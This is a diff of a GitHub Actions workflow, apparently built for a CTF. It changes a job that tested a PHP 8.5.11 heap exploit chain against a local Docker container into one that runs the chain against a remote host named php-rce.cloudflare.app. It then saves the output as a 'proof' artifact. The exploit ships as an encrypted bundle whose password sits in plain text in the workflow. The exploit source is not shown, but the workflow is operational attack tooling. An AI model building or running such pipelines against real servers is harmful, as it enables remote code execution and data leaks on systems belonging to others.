@@ -3,7 +3,7 @@ name: Remote proof
 on:
   push:
     branches:
-      - cloudflare-ctf-run
+      - cloudflare-ctf-final
   workflow_dispatch:
 
 permissions:
@@ -16,30 +16,25 @@ concurrency:
 jobs:
   prove:
     runs-on: ubuntu-latest
-    timeout-minutes: 10
+    timeout-minutes: 5
     steps:
       - uses: actions/checkout@v4
-      - name: Sweep PHP 8.5.11 heap layouts
+      - name: Run the validated PHP 8.5.11 chain
         run: |
           openssl enc -d -aes-256-cbc -pbkdf2 -iter 200000 -in cloudflare-ctf.enc -out /tmp/cloudflare-ctf.tar.gz -pass pass:cloudflare-ctf-run
           tar -C /tmp -xzf /tmp/cloudflare-ctf.tar.gz
           cd /tmp/cf-layout-bundle
-          mkdir -p /tmp/cloudflare-php-ctf /tmp/layout-variants
+          mkdir -p /tmp/cloudflare-php-ctf /tmp/layout-variants /tmp/cloudflare-proof
           python build_layout_variants.py b1-all-windows-20000-files160.bin /tmp/layout-variants >/tmp/layout-build.log
-          docker build -t cf-php-layout -f Dockerfile.local .
           set +e
-          for payload in /tmp/layout-variants/*.bin; do
-            name=$(basename "$payload" .bin)
-            docker rm -f cf-php-layout-run >/dev/null 2>&1
-            docker run -d --name cf-php-layout-run -p 18087:80 cf-php-layout >/dev/null
-            until curl -fsS http://127.0.0.1:18087/index.php >/dev/null; do sleep 0.1; done
-            rm -f /tmp/cloudflare-php-ctf/affine-leak.bin
-            python affine_chain_8511.py --target http://127.0.0.1:18087 --endpoint /index.php --warmup warmup.bin --a1 a1-physical-pages-2.bin --b1 "$payload" --query-order 1234 --leak-length 0x20000 --pipeline-pairs --leak-only >/tmp/layout-run.log 2>&1
-            status=$?
-            echo "LAYOUT=$name STATUS=$status"
-            sed -n '/^A1 /p;/^B1 /p' /tmp/layout-run.log
-            if test -s /tmp/cloudflare-php-ctf/affine-leak.bin; then
-              python summarize_layout.py /tmp/cloudflare-php-ctf/affine-leak.bin
-            fi
-          done
-          docker rm -f cf-php-layout-run >/dev/null 2>&1
+          python affine_chain_8511.py --target https://php-rce.cloudflare.app --endpoint /php/index.php --verify --warmup warmup.bin --a1 a1-physical-pages-2.bin --b1 /tmp/layout-variants/160-post-forge.bin --query-order 1234 --leak-length 0x18000 --pipeline-pairs > /tmp/cloudflare-proof/run.log 2>&1
+          status=$?
+          cat /tmp/cloudflare-proof/run.log
+          exit "$status"
+      - name: Preserve the proof transcript
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: cloudflare-proof
+          path: /tmp/cloudflare-proof/run.log
+          retention-days: 1
